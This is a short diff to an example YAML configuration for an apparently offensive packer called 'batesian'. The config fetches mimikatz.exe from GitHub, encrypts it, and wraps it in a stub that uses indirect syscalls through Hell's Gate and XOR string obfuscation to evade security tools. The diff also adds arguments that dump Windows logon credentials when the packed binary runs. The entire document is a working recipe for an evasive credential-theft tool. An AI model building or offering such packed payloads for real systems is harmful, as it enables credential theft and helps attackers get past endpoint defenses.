@@ -1,17 +1,26 @@
 # Example configuration to pack mimikatz.exe.
 # Usage: batesian build examples/configs/mimikatz.yaml
 
-schema: 2
+schema: 4
 name: mimikatz-basic
 
 build:
   payload:
     source: "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
+    args:
+      - "privilege::debug"
+      - "sekurlsa::logonpasswords"
     crypto:
       algo: xchacha20poly1305
       key: random
-  strings:
-    strategy: xor
+
+  stub:
+    syscalls:
+      mode: indirect
+      resolver: hells_gate
+    strings:
+      strategy: xor
+
   output:
     path: ./dist/mimikatz_packed.exe
     arch: x64
